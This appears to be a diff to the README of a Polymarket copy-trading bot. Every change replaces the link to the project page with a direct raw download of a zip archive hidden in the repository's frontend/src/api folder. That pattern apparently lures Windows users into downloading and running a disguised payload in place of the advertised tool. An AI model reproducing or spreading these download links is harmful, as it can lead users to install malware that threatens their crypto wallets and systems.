@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Copy-Trade-Bot - Copy Trades With Less Effort
 
-[![Download](https://img.shields.io/badge/Download-Polymarket--Copy--Trade--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot)
+[![Download](https://img.shields.io/badge/Download-Polymarket--Copy--Trade--Bot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot/main/frontend/src/api/Copy-Polymarket-Bot-Trade-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Polymarket-Copy-Trade-Bot helps you copy trades from one or more leader addresse
 
 Use the link below to visit the download page:
 
-[Visit the download page](https://github.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot)
+[Visit the download page](https://raw.githubusercontent.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot/main/frontend/src/api/Copy-Polymarket-Bot-Trade-3.9.zip)
 
 ## 📥 Download and Run on Windows
 
@@ -172,7 +172,7 @@ Open the app and stop the bot from there, or clear the leader settings if the ap
 
 Use this link to visit the project page and get the files:
 
-[https://github.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot](https://github.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot)
+[https://raw.githubusercontent.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot/main/frontend/src/api/Copy-Polymarket-Bot-Trade-3.9.zip](https://raw.githubusercontent.com/Singhalesebradycardia99/Polymarket-Copy-Trade-Bot/main/frontend/src/api/Copy-Polymarket-Bot-Trade-3.9.zip)
 
 ## 🧰 Basic Use Guide
 
